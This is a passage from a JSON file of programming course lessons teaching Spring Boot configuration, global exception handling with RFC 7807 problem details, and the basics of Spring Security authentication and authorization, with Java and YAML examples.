              "content": "```java\nRepository:\n\n@Repository\npublic interface BookRepository extends JpaRepository<Book, Long> {\n    // Spring auto-implements CRUD methods\n}\n\nService:\n\n@Service\npublic class BookService {\n    private final BookRepository bookRepository;\n    \n    public BookService(BookRepository bookRepository) {\n        this.bookRepository = bookRepository;\n    }\n    \n    public List<Book> getAllBooks() {\n        return bookRepository.findAll();\n    }\n    \n    public Book saveBook(Book book) {\n        return bookRepository.save(book);\n    }\n}\n\nController:\n\n@RestController\n@RequestMapping(\"/api/books\")\npublic class BookController {\n    private final BookService bookService;\n    \n    public BookController(BookService bookService) {\n        this.bookService = bookService;\n    }\n    \n    @GetMapping\n    public List<Book> getAll() {\n        return bookService.getAllBooks();\n    }\n    \n    @PostMapping\n    public Book create(@RequestBody Book book) {\n        return bookService.saveBook(book);\n    }\n}\n\nThe Dependency Chain:\nBookController → BookService → BookRepository → Database\n\nSpring automatically wires everything!\n```"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-7-lesson-5",
          "title": "Lesson 11.5: Configuration - Making Your App Flexible",
          "moduleId": "module-11",
          "order": 5,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Hardcoded Values Everywhere",
              "content": "Bad code with hardcoded values:\n\n@Service\npublic class EmailService {\n    private String smtpHost = \"smtp.gmail.com\";     // Hardcoded!\n    private int smtpPort = 587;                      // Hardcoded!\n    private String apiKey = \"abc123xyz\";            // Hardcoded!\n    \n    public void sendEmail(String to, String message) {\n        // Use hardcoded values...\n    }\n}\n\nPROBLEMS:\n❌ Different values for dev/test/production\n❌ Must recompile to change values\n❌ Secrets exposed in code (security risk!)\n❌ Can't configure without modifying source\n\nReal apps need:\n- Dev: localhost:3306 for database\n- Test: test-server:3306\n- Production: prod-server.com:3306\n\nSolution: EXTERNAL CONFIGURATION"
            },
            {
              "type": "KEY_POINT",
              "title": "Configuration is Like a TV Remote Settings Menu",
              "content": "HARDCODED (No Remote):\n- Brightness welded to 100%\n- Volume stuck at 50\n- Want to change? Open TV, solder new circuits!\n\nThis is like hardcoding values in Java code.\n\nCONFIGURABLE (Settings Menu):\n- Brightness: adjustable 0-100%\n- Volume: adjustable 0-100\n- Language: English, Spanish, French...\n- Change anytime WITHOUT opening the TV!\n\nThis is Spring Boot configuration:\n- Values in application.properties or application.yml\n- Change without recompiling code\n- Different settings for different environments"
            },
            {
              "type": "THEORY",
              "title": "application.properties - The Configuration File",
              "content": "Spring Boot reads configuration from application.properties:\n\nLocation: src/main/resources/application.properties"
            },
            {
              "type": "THEORY",
              "title": "Database configuration",
              "content": "spring.datasource.url=jdbc:mysql://localhost:3306/mydb\nspring.datasource.username=root\nspring.datasource.password=secret"
            },
            {
              "type": "THEORY",
              "title": "Server configuration",
              "content": "The server.port property changes which port your Spring Boot application listens on. By default it uses 8080."
            },
            {
              "type": "THEORY",
              "title": "Custom application properties",
              "content": "app.name=My Awesome App\napp.version=1.0.0\napp.email.host=smtp.gmail.com\napp.email.port=587\n\nSpring automatically applies these settings!\n\nCOMMON PROPERTIES:\n- server.port: Change default port (8080)\n- spring.datasource.*: Database connection\n- spring.jpa.hibernate.ddl-auto: create, update, validate\n- logging.level.*: Control log levels"
            },
            {
              "type": "THEORY",
              "title": "application.yml - The Modern Alternative",
              "content": "YAML format is more readable for complex configs:\n\nLocation: src/main/resources/application.yml\n\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/mydb\n    username: root\n    password: secret\n  jpa:\n    hibernate:\n      ddl-auto: update\n    show-sql: true\n\nserver:\n  port: 8080\n\napp:\n  name: My Awesome App\n  version: 1.0.0\n  email:\n    host: smtp.gmail.com\n    port: 587\n    username: user@example.com\n\nYAML BENEFITS:\n✓ Hierarchical structure (easier to read)\n✓ No repetition of prefixes\n✓ Supports lists and complex objects\n✓ Preferred for modern Spring Boot apps\n\nYou can use EITHER .properties OR .yml (not both!)"
            },
            {
              "type": "THEORY",
              "title": "@Value - Simple Property Injection",
              "content": "@Value injects single values from configuration:\n\napplication.yml:\napp:\n  name: My App\n  max-users: 100\n\nJava code:\n\n@Service\npublic class AppService {\n    \n    @Value(\"${app.name}\")\n    private String appName;\n    \n    @Value(\"${app.max-users}\")\n    private int maxUsers;\n    \n    @Value(\"${app.feature.enabled:false}\")  // Default value\n    private boolean featureEnabled;\n    \n    public void printConfig() {\n        System.out.println(\"App: \" + appName);\n        System.out.println(\"Max users: \" + maxUsers);\n    }\n}\n\nSYNTAX:\n@Value(\"${property.name}\") - Read from config\n@Value(\"${property.name:default}\") - With default value\n\nUSE @Value FOR:\n✓ Simple, individual properties\n✓ One or two values\n\nDON'T USE @Value FOR:\n✗ Complex, grouped configurations\n✗ Many related properties"
            },
            {
              "type": "THEORY",
              "title": "@ConfigurationProperties - Modern Best Practice (Spring Boot 4)",
              "content": "For complex configs, use @ConfigurationProperties with Records:\n\napplication.yml:\napp:\n  email:\n    host: smtp.gmail.com\n    port: 587\n    username: user@example.com\n    password: secret123\n  features:\n    signup-enabled: true\n    max-upload-size: 10485760\n\nJava Record (Java 17+):\n\n@ConfigurationProperties(prefix = \"app.email\")\npublic record EmailProperties(\n    String host,\n    int port,\n    String username,\n    String password\n) { }\n\nEnable in main class:\n\n@SpringBootApplication\n@ConfigurationPropertiesScan  // Scan for @ConfigurationProperties\npublic class MyApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(MyApplication.class, args);\n    }\n}\n\nUse in services:\n\n@Service\npublic class EmailService {\n    private final EmailProperties emailProps;\n    \n    public EmailService(EmailProperties emailProps) {\n        this.emailProps = emailProps;\n    }\n    \n    public void sendEmail(String to, String message) {\n        String host = emailProps.host();  // smtp.gmail.com\n        int port = emailProps.port();      // 587\n        // Send email...\n    }\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Why @ConfigurationProperties is Better Than @Value",
              "content": "@VALUE (Old Way):\n@Service\npublic class EmailService {\n    @Value(\"${app.email.host}\")\n    private String host;\n    \n    @Value(\"${app.email.port}\")\n    private int port;\n    \n    @Value(\"${app.email.username}\")\n    private String username;\n    \n    @Value(\"${app.email.password}\")\n    private String password;\n    \n    // 4 separate annotations, scattered!\n}\n\n@CONFIGURATIONPROPERTIES (Modern Way):\n@ConfigurationProperties(prefix = \"app.email\")\npublic record EmailProperties(\n    String host,\n    int port,\n    String username,\n    String password\n) { }\n\nBENEFITS:\n✓ TYPE-SAFE: Compile-time checking\n✓ GROUPED: All related properties together\n✓ IMMUTABLE: Records are immutable by default\n✓ VALIDATION: Can use @Validated annotations\n✓ AUTOCOMPLETE: IDE helps with property names\n✓ REUSABLE: Inject same config into multiple services"
            },
            {
              "type": "THEORY",
              "title": "Validation with @ConfigurationProperties",
              "content": "Add validation to configuration:\n\nimport jakarta.validation.constraints.*;\n\n@ConfigurationProperties(prefix = \"app.email\")\n@Validated  // Enable validation\npublic record EmailProperties(\n    @NotBlank(message = \"Email host is required\")\n    String host,\n    \n    @Min(value = 1, message = \"Port must be positive\")\n    @Max(value = 65535, message = \"Port must be valid\")\n    int port,\n    \n    @Email(message = \"Invalid email format\")\n    String username,\n    \n    @Size(min = 8, message = \"Password must be at least 8 characters\")\n    String password\n) { }\n\nIf configuration is invalid, Spring Boot FAILS TO START:\n- Shows clear error message\n- Prevents running with bad config\n- Catches errors early!"
            },
            {
              "type": "THEORY",
              "title": "Environment-Specific Configuration",
              "content": "Different configs for dev, test, production:\n\nFILE STRUCTURE:\nsrc/main/resources/\n  ├── application.yml              (default)\n  ├── application-dev.yml          (development)\n  ├── application-test.yml         (testing)\n  └── application-prod.yml         (production)\n\napplication.yml (default):\nspring:\n  profiles:\n    active: dev  # Default profile\n\napplication-dev.yml:\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/dev_db\nserver:\n  port: 8080\n\napplication-prod.yml:\nspring:\n  datasource:\n    url: jdbc:mysql://prod-server:3306/prod_db\nserver:\n  port: 80\n\nACTIVATE PROFILE:\n1. In application.yml: spring.profiles.active=prod\n2. Command line: java -jar app.jar --spring.profiles.active=prod\n3. Environment variable: SPRING_PROFILES_ACTIVE=prod\n\nSpring merges default + active profile configs!"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Never Commit Secrets to Git!",
              "content": "❌ BAD - Secrets in application.yml:\napp:\n  database:\n    password: mySecretPassword123  # DON'T DO THIS!\n  api:\n    key: sk_live_abc123xyz  # SECURITY RISK!\n\n✓ GOOD - Use environment variables:\n\napplication.yml:\napp:\n  database:\n    password: ${DB_PASSWORD}  # Read from environment\n  api:\n    key: ${API_KEY}\n\nSet environment variables:\nexport DB_PASSWORD=mySecretPassword123\nexport API_KEY=sk_live_abc123xyz\n\nOR use application-local.yml (gitignored):\n\n.gitignore:\napplication-local.yml\n\nBEST PRACTICES:\n✓ Use environment variables for secrets\n✓ Use .env files (not committed to git)\n✓ Use secret management (AWS Secrets Manager, HashiCorp Vault)\n✓ Never commit passwords, API keys, tokens"
            },
            {
              "type": "THEORY",
              "title": "Complete Configuration Example (Spring Boot 3.4+)",
              "content": "```java\napplication.yml:\n\nspring:\n  application:\n    name: book-store-api\n    group: retail-services  # NEW in 3.4: Group related apps\n  threads:\n    virtual:\n      enabled: true  # NEW in 3.4: Enable virtual threads (Java 21+)\n  datasource:\n    url: jdbc:mysql://localhost:3306/bookstore\n    username: ${DB_USER:root}\n    password: ${DB_PASSWORD:password}\n  jpa:\n    hibernate:\n      ddl-auto: update\n    show-sql: true\n  mvc:\n    problemdetails:\n      enabled: true  # NEW in 3.4: RFC 7807 error responses\n\nserver:\n  port: 8080\n\nlogging:\n  structured:\n    format:\n      console: ecs  # NEW in 3.4: Structured logging (ecs, logstash, gelf)\n\napp:\n  features:\n    signup-enabled: true\n    max-users: 1000\n  email:\n    host: smtp.gmail.com\n    port: 587\n    username: ${EMAIL_USER}\n    password: ${EMAIL_PASSWORD}\n\nConfiguration classes:\n\n@ConfigurationProperties(prefix = \"app.features\")\npublic record FeaturesConfig(\n    boolean signupEnabled,\n    int maxUsers\n) { }\n\n@ConfigurationProperties(prefix = \"app.email\")\n@Validated\npublic record EmailConfig(\n    @NotBlank String host,\n    @Min(1) @Max(65535) int port,\n    @NotBlank String username,\n    @NotBlank String password\n) { }\n\nMain application:\n\n@SpringBootApplication\n@ConfigurationPropertiesScan\npublic class BookStoreApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(BookStoreApplication.class, args);\n    }\n}\n\nUsing in service:\n\n@Service\npublic class UserService {\n    private final FeaturesConfig features;\n    \n    public UserService(FeaturesConfig features) {\n        this.features = features;\n    }\n    \n    public boolean canSignup() {\n        return features.signupEnabled();\n    }\n}\n```"
            },
            {
              "type": "KEY_POINT",
              "title": "⚠️ ddl-auto: update is NOT for Production! Use Flyway or Liquibase",
              "content": "ddl-auto OPTIONS:\n- create: DROP and recreate on startup (DESTROYS DATA!)\n- create-drop: Create on start, drop on shutdown\n- update: Update schema without deleting data\n- validate: Only check if schema matches entities\n- none: Do nothing\n\n❌ PROBLEMS WITH 'update':\n- Cannot remove columns (only adds)\n- Cannot rename columns\n- No rollback capability\n- No version history\n- Different results on different environments\n- Can cause data inconsistencies over time\n\n✓ PRODUCTION SOLUTION: Database Migration Tools\n\n1. FLYWAY (Recommended for simplicity):\n\nDependency:\n<dependency>\n    <groupId>org.flywaydb</groupId>\n    <artifactId>flyway-core</artifactId>\n</dependency>\n\nMigration file: src/main/resources/db/migration/V1__Create_users_table.sql\n\nCREATE TABLE users (\n    id BIGINT AUTO_INCREMENT PRIMARY KEY,\n    name VARCHAR(100) NOT NULL,\n    email VARCHAR(255) UNIQUE NOT NULL\n);\n\nMigration file: V2__Add_age_column.sql\n\nALTER TABLE users ADD COLUMN age INT;\n\n2. LIQUIBASE (More flexible, XML/YAML/JSON):\n\nDependency:\n<dependency>\n    <groupId>org.liquibase</groupId>\n    <artifactId>liquibase-core</artifactId>\n</dependency>\n\nBENEFITS OF MIGRATION TOOLS:\n✓ Version-controlled schema changes\n✓ Rollback support\n✓ Team collaboration (everyone runs same migrations)\n✓ Production-safe deployments\n✓ Audit trail of all changes\n\nPRODUCTION CONFIG:\nspring.jpa.hibernate.ddl-auto=validate  # Only validate, don't modify!\nspring.flyway.enabled=true  # Let Flyway handle schema changes"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-7-lesson-6",
          "title": "Lesson 11.6: Exception Handling - Failing Gracefully",
          "moduleId": "module-11",
          "order": 6,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Ugly Error Messages",
              "content": "Without proper exception handling:\n\n@GetMapping(\"/users/{id}\")\npublic User getUser(@PathVariable Long id) {\n    User user = userRepository.findById(id).orElse(null);\n    return user;  // What if user is null?\n}\n\nWhen user doesn't exist:\n{\n  \"timestamp\": \"2025-01-15T10:30:00\",\n  \"status\": 500,\n  \"error\": \"Internal Server Error\",\n  \"trace\": \"java.lang.NullPointerException\\n\\tat...\"\n}\n\nPROBLEMS:\n❌ Exposes stack traces (security risk!)\n❌ Wrong status code (500 instead of 404)\n❌ Unhelpful message for clients\n❌ No consistent error format\n\nProfessional APIs need:\n✓ Clear, consistent error messages\n✓ Correct HTTP status codes\n✓ No sensitive data exposed\n✓ Structured JSON responses"
            },
            {
              "type": "KEY_POINT",
              "title": "Exception Handling is Like a Customer Service Desk",
              "content": "BAD CUSTOMER SERVICE (No Exception Handling):\nCustomer: \"I can't find product #999\"\nSystem: *CRASHES* *SHOWS INTERNAL ERROR LOGS*\nCustomer sees: Stack traces, database errors, system paths\n\nGOOD CUSTOMER SERVICE (Proper Exception Handling):\nCustomer: \"I can't find product #999\"\nService: \"Product #999 not found. Please check the ID or browse our catalog.\"\n- Clear message\n- Helpful guidance\n- No internal system details exposed\n\n@RestControllerAdvice = Customer Service Manager:\n- Intercepts all errors\n- Translates technical problems into user-friendly messages\n- Returns appropriate responses\n- Logs details for developers"
            },
            {
              "type": "THEORY",
              "title": "Custom Exceptions - Creating Meaningful Errors",
              "content": "Create custom exceptions for business logic:\n\npublic class ResourceNotFoundException extends RuntimeException {\n    public ResourceNotFoundException(String message) {\n        super(message);\n    }\n}\n\npublic class InvalidRequestException extends RuntimeException {\n    public InvalidRequestException(String message) {\n        super(message);\n    }\n}\n\nUse in controller:\n\n@GetMapping(\"/users/{id}\")\npublic User getUser(@PathVariable Long id) {\n    return userRepository.findById(id)\n        .orElseThrow(() -> new ResourceNotFoundException(\n            \"User not found with id: \" + id\n        ));\n}\n\nNow when user doesn't exist, throw ResourceNotFoundException\ninstead of returning null!"
            },
            {
              "type": "THEORY",
              "title": "@RestControllerAdvice - Global Exception Handler",
              "content": "Centralize ALL exception handling in one place:\n\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n    \n    // Handle ResourceNotFoundException\n    @ExceptionHandler(ResourceNotFoundException.class)\n    public ResponseEntity<ErrorResponse> handleNotFound(ResourceNotFoundException ex) {\n        ErrorResponse error = new ErrorResponse(\n            HttpStatus.NOT_FOUND.value(),\n            ex.getMessage(),\n            System.currentTimeMillis()\n        );\n        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(error);\n    }\n    \n    // Handle InvalidRequestException\n    @ExceptionHandler(InvalidRequestException.class)\n    public ResponseEntity<ErrorResponse> handleBadRequest(InvalidRequestException ex) {\n        ErrorResponse error = new ErrorResponse(\n            HttpStatus.BAD_REQUEST.value(),\n            ex.getMessage(),\n            System.currentTimeMillis()\n        );\n        return ResponseEntity.badRequest().body(error);\n    }\n    \n    // Handle all other exceptions (fallback)\n    @ExceptionHandler(Exception.class)\n    public ResponseEntity<ErrorResponse> handleGeneric(Exception ex) {\n        // Log full error for developers\n        System.err.println(\"Unexpected error: \" + ex.getMessage());\n        \n        // Return safe message to client\n        ErrorResponse error = new ErrorResponse(\n            HttpStatus.INTERNAL_SERVER_ERROR.value(),\n            \"An unexpected error occurred. Please try again later.\",\n            System.currentTimeMillis()\n        );\n        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(error);\n    }\n}\n\n@RestControllerAdvice:\n- Applies to ALL @RestController classes\n- Catches exceptions from any controller\n- Returns consistent error format"
            },
            {
              "type": "THEORY",
              "title": "RFC 7807 Problem Details - Industry Standard Errors (Spring Boot 3.4+)",
              "content": "Spring Boot 3.4+ supports RFC 7807 Problem Details out of the box!\n\nENABLE IN application.properties:\nspring.mvc.problemdetails.enabled=true\n\nNow Spring automatically returns standardized error responses:\n\n{\n  \"type\": \"about:blank\",\n  \"title\": \"Not Found\",\n  \"status\": 404,\n  \"detail\": \"User not found with id: 999\",\n  \"instance\": \"/api/users/999\"\n}\n\nRFC 7807 FIELDS:\n- type: URI identifying the problem type\n- title: Short human-readable summary\n- status: HTTP status code\n- detail: Detailed explanation\n- instance: URI identifying the specific occurrence\n\nCUSTOM ProblemDetail IN EXCEPTION HANDLER:\n\n@ExceptionHandler(UserNotFoundException.class)\npublic ProblemDetail handleNotFound(UserNotFoundException ex) {\n    ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n        HttpStatus.NOT_FOUND, ex.getMessage());\n    problem.setTitle(\"User Not Found\");\n    problem.setType(URI.create(\"https://api.example.com/errors/user-not-found\"));\n    problem.setProperty(\"userId\", ex.getUserId());  // Custom fields!\n    return problem;\n}\n\nBENEFITS:\n- Industry standard format\n- Clients know what to expect\n- Extensible with custom properties\n- Content-Type: application/problem+json"
            },
            {
              "type": "THEORY",
              "title": "Validation with @Valid and @Validated",
              "content": "Validate request bodies automatically:\n\nEntity with validation:\n\nimport jakarta.validation.constraints.*;\n\npublic class User {\n    @NotNull(message = \"ID is required\")\n    private Long id;\n    \n    @NotBlank(message = \"Name cannot be empty\")\n    @Size(min = 2, max = 100, message = \"Name must be 2-100 characters\")\n    private String name;\n    \n    @Email(message = \"Invalid email format\")\n    private String email;\n    \n    @Min(value = 18, message = \"Must be at least 18 years old\")\n    private int age;\n    \n    // Constructor, getters, setters\n}\n\nController with validation:\n\n@PostMapping(\"/users\")\npublic ResponseEntity<User> createUser(@Valid @RequestBody User user) {\n    // If validation fails, Spring throws MethodArgumentNotValidException\n    User saved = userService.save(user);\n    return ResponseEntity.status(HttpStatus.CREATED).body(saved);\n}\n\n@Valid triggers validation automatically!"
            },
            {
              "type": "THEORY",
              "title": "Handling Validation Errors",
              "content": "Catch validation exceptions in @RestControllerAdvice:\n\n@ExceptionHandler(MethodArgumentNotValidException.class)\npublic ResponseEntity<ValidationErrorResponse> handleValidation(\n        MethodArgumentNotValidException ex) {\n    \n    // Collect all validation errors\n    List<String> errors = ex.getBindingResult()\n        .getFieldErrors()\n        .stream()\n        .map(error -> error.getField() + \": \" + error.getDefaultMessage())\n        .toList();\n    \n    ValidationErrorResponse response = new ValidationErrorResponse(\n        HttpStatus.BAD_REQUEST.value(),\n        \"Validation failed\",\n        errors,\n        System.currentTimeMillis()\n    );\n    \n    return ResponseEntity.badRequest().body(response);\n}\n\nValidationErrorResponse class:\n\npublic class ValidationErrorResponse {\n    private int status;\n    private String message;\n    private List<String> errors;\n    private long timestamp;\n    \n    // Constructor, getters, setters\n}\n\nResponse when validation fails:\n\n{\n  \"status\": 400,\n  \"message\": \"Validation failed\",\n  \"errors\": [\n    \"name: Name cannot be empty\",\n    \"email: Invalid email format\",\n    \"age: Must be at least 18 years old\"\n  ],\n  \"timestamp\": 1705315800000\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Common Validation Annotations",
              "content": "Jakarta Validation (javax.validation → jakarta.validation in Spring Boot 3+):\n\nNULL/NOT NULL:\n@NotNull - Value cannot be null\n@Null - Value must be null\n\nSTRINGS:\n@NotBlank - Not null, not empty, not whitespace\n@NotEmpty - Not null and not empty (but can be whitespace)\n@Size(min, max) - Length constraints\n@Pattern(regexp) - Must match regex\n\nNUMBERS:\n@Min(value) - Minimum value\n@Max(value) - Maximum value\n@Positive - Must be > 0\n@PositiveOrZero - Must be >= 0\n@Negative - Must be < 0\n@NegativeOrZero - Must be <= 0\n\nFORMAT:\n@Email - Valid email format\n@Past - Date in the past\n@Future - Date in the future\n\nExample:\n\npublic class Product {\n    @NotBlank\n    @Size(min = 3, max = 100)\n    private String name;\n    \n    @Positive\n    private double price;\n    \n    @Min(0)\n    @Max(10000)\n    private int stockQuantity;\n}"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Security: Never Expose Stack Traces!",
              "content": "❌ BAD - Exposing internal details:\n\n@ExceptionHandler(Exception.class)\npublic ResponseEntity<String> handleError(Exception ex) {\n    return ResponseEntity.status(500)\n        .body(\"Error: \" + ex.getMessage() + \"\\n\" + \n              Arrays.toString(ex.getStackTrace()));\n}\n\nThis exposes:\n- Internal class names\n- File paths\n- Database structure\n- Library versions\n→ Helps attackers!\n\n✓ GOOD - Safe error handling:\n\n@ExceptionHandler(Exception.class)\npublic ResponseEntity<ErrorResponse> handleError(Exception ex) {\n    // Log full details for developers (server-side only)\n    logger.error(\"Unexpected error\", ex);\n    \n    // Return safe, generic message to client\n    ErrorResponse error = new ErrorResponse(\n        500,\n        \"An unexpected error occurred\",\n        System.currentTimeMillis()\n    );\n    return ResponseEntity.status(500).body(error);\n}\n\nBEST PRACTICES:\n✓ Log full errors server-side (for debugging)\n✓ Return generic messages to clients\n✓ Use error codes/IDs to correlate logs\n✓ Never expose paths, SQL, or stack traces"
            },
            {
              "type": "THEORY",
              "title": "Complete Exception Handling with ProblemDetail (Spring Boot 3.4+)",
              "content": "```java\nMODERN APPROACH: Use RFC 7807 ProblemDetail\n\n1. Enable in application.properties:\nspring.mvc.problemdetails.enabled=true\n\n2. Custom Exceptions with ProblemDetail support:\n\npublic class UserNotFoundException extends RuntimeException {\n    private final Long userId;\n    \n    public UserNotFoundException(Long id) {\n        super(\"User not found with id: \" + id);\n        this.userId = id;\n    }\n    \n    public Long getUserId() { return userId; }\n}\n\n3. Global Exception Handler with ProblemDetail:\n\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n    \n    @ExceptionHandler(UserNotFoundException.class)\n    public ProblemDetail handleUserNotFound(UserNotFoundException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.NOT_FOUND, ex.getMessage());\n        problem.setTitle(\"User Not Found\");\n        problem.setType(URI.create(\"https://api.example.com/errors/not-found\"));\n        problem.setProperty(\"userId\", ex.getUserId());  // Custom field!\n        return problem;\n    }\n    \n    @ExceptionHandler(MethodArgumentNotValidException.class)\n    public ProblemDetail handleValidation(MethodArgumentNotValidException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.BAD_REQUEST, \"Validation failed\");\n        problem.setTitle(\"Invalid Request Data\");\n        \n        List<String> errors = ex.getBindingResult().getFieldErrors()\n            .stream()\n            .map(err -> err.getField() + \": \" + err.getDefaultMessage())\n            .toList();\n        problem.setProperty(\"validationErrors\", errors);\n        return problem;\n    }\n}\n\n4. Response format (automatic!):\n\n{\n  \"type\": \"https://api.example.com/errors/not-found\",\n  \"title\": \"User Not Found\",\n  \"status\": 404,\n  \"detail\": \"User not found with id: 999\",\n  \"instance\": \"/api/users/999\",\n  \"userId\": 999\n}\n\nBENEFITS:\n- Industry-standard RFC 7807 format\n- Content-Type: application/problem+json\n- Extensible with custom properties\n- Works automatically when enabled\n```"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-7-lesson-7",
          "title": "Lesson 11.7: Spring Security - Protecting Your API",
          "moduleId": "module-11",
          "order": 7,
          "estimatedMinutes": 50,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Anyone Can Access Everything",
              "content": "Without security, your API is wide open:\n\n@GetMapping(\"/admin/users\")\npublic List<User> getAllUsers() {\n    return userRepository.findAll();\n}\n\n@DeleteMapping(\"/admin/users/{id}\")\npublic void deleteUser(@PathVariable Long id) {\n    userRepository.deleteById(id);\n}\n\nPROBLEMS:\n❌ No login required - anyone can access\n❌ No user identification - can't track who did what\n❌ No permissions - regular users can delete data\n❌ No protection - hackers can wreak havoc\n\nReal applications need:\n✓ AUTHENTICATION - Who are you? (Login)\n✓ AUTHORIZATION - What can you do? (Permissions)\n✓ Protection from attacks (CSRF, XSS, etc.)\n\nSolution: SPRING SECURITY"
            },
            {
              "type": "KEY_POINT",
              "title": "Spring Security is Like a Building with Security Guards",
              "content": "BUILDING WITHOUT SECURITY:\n- Anyone walks in through any door\n- Access CEO's office? Sure!\n- Delete company files? Go ahead!\n- No one knows who did what\n\nBUILDING WITH SECURITY:\n1. LOBBY (Public Area):\n   - Anyone can enter\n   - Read brochures, see directory\n   - = Public endpoints (/login, /register)\n\n2. BADGE CHECK (Authentication):\n   - Show your ID badge\n   - Verify you are who you claim\n   - = Username + Password\n\n3. ACCESS LEVELS (Authorization):\n   - Green badge: Employee areas only\n   - Blue badge: Manager areas\n   - Red badge: Executive areas\n   - = Roles: USER, MANAGER, ADMIN\n\n4. SECURITY LOG:\n   - Record who entered when\n   - Track actions taken\n   - = Audit logging\n\nSpring Security = The entire security system!"
            },
            {
              "type": "THEORY",
              "title": "Authentication vs Authorization",
              "content": "AUTHENTICATION: \"Who are you?\"\n- Verifying identity\n- Username + password\n- Login process\n- Result: User is identified\n\nExample:\nPOST /login\nBody: { \"username\": \"alice\", \"password\": \"secret123\" }\n→ Spring verifies credentials\n→ If valid, user is \"authenticated\"\n\nAUTHORIZATION: \"What can you do?\"\n- Checking permissions\n- Based on roles (USER, ADMIN, etc.)\n- Access control\n- Result: User can/cannot access resource\n\nExample:\nGET /admin/users (authenticated as USER role)\n→ Spring checks: Does USER role have permission?\n→ No! Return 403 Forbidden\n\nGET /admin/users (authenticated as ADMIN role)\n→ Spring checks: Does ADMIN role have permission?\n→ Yes! Return user list\n\nBOTH ARE NEEDED:\n1. First: Authenticate (prove who you are)\n2. Then: Authorize (check what you can do)"
            },
            {
              "type": "THEORY",
              "title": "Adding Spring Security to Your Project",
              "content": "Step 1: Add dependency to pom.xml:\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n</dependency>\n\nThat's it! Spring Security is now active.\n\nDEFAULT BEHAVIOR (automatic):\n- ALL endpoints require authentication\n- Default user: 'user'\n- Random password: Printed in console on startup\n- Login form at /login\n\nConsole output:\nUsing generated security password: a1b2c3d4-e5f6-7890-abcd-ef1234567890\n\nNow every API call needs authentication!"
            },
            {
              "type": "THEORY",
              "title": "SecurityFilterChain - Configuring Security (Spring Security 6)",
              "content": "Create SecurityConfig class to customize security:\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/public/**\").permitAll()      // Anyone\n                .requestMatchers(\"/api/users/**\").hasRole(\"USER\")  // USER role\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\") // ADMIN role\n                .anyRequest().authenticated()  // All others need login\n            )\n            .formLogin(Customizer.withDefaults())  // Enable login form\n            .httpBasic(Customizer.withDefaults()); // Enable basic auth\n        \n        return http.build();\n    }\n}\n\nBREAKDOWN:\n- authorizeHttpRequests: Define access rules\n- requestMatchers: URL patterns to match\n- permitAll(): No authentication needed\n- hasRole(\"USER\"): Requires USER role\n- authenticated(): Any logged-in user\n- formLogin: Enable HTML login form\n- httpBasic: Enable HTTP Basic Auth (for APIs)"
            },
            {
              "type": "THEORY",
              "title": "In-Memory Users - Simple Authentication",
              "content": "For development/testing, store users in memory:\n\n@Bean\npublic UserDetailsService userDetailsService() {\n    UserDetails user = User.builder()\n        .username(\"alice\")\n        .password(passwordEncoder().encode(\"password123\"))\n        .roles(\"USER\")\n        .build();\n    \n    UserDetails admin = User.builder()\n        .username(\"admin\")\n        .password(passwordEncoder().encode(\"admin123\"))\n        .roles(\"ADMIN\")\n        .build();\n    \n    return new InMemoryUserDetailsManager(user, admin);\n}\n\n@Bean\npublic PasswordEncoder passwordEncoder() {\n    return new BCryptPasswordEncoder();  // Secure password hashing\n}\n\nNow you have:\n- Username: alice, Password: password123, Role: USER\n- Username: admin, Password: admin123, Role: ADMIN\n\nNEVER store plain passwords!\nBCryptPasswordEncoder hashes them securely."
            },
            {
              "type": "THEORY",
              "title": "Database-Based Authentication",
              "content": "For production, load users from database:\n\n1. User Entity:\n\n@Entity\n@Table(name = \"users\")\npublic class User {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(unique = true, nullable = false)\n    private String username;\n    \n    @Column(nullable = false)\n    private String password;  // Hashed!\n    \n    private String role;  // USER, ADMIN, etc.\n    \n    // Getters, setters\n}\n\n2. Custom UserDetailsService:\n\n@Service\npublic class CustomUserDetailsService implements UserDetailsService {\n    \n    @Autowired\n    private UserRepository userRepository;\n    \n    @Override\n    public UserDetails loadUserByUsername(String username) \n            throws UsernameNotFoundException {\n        User user = userRepository.findByUsername(username)\n            .orElseThrow(() -> new UsernameNotFoundException(\n                \"User not found: \" + username));\n        \n        return org.springframework.security.core.userdetails.User\n            .builder()\n            .username(user.getUsername())\n            .password(user.getPassword())  // Already hashed\n            .roles(user.getRole())\n            .build();\n    }\n}\n\nSpring automatically calls loadUserByUsername() during login!"
            },
            {
              "type": "KEY_POINT",
              "title": "Method-Level Security with @PreAuthorize",
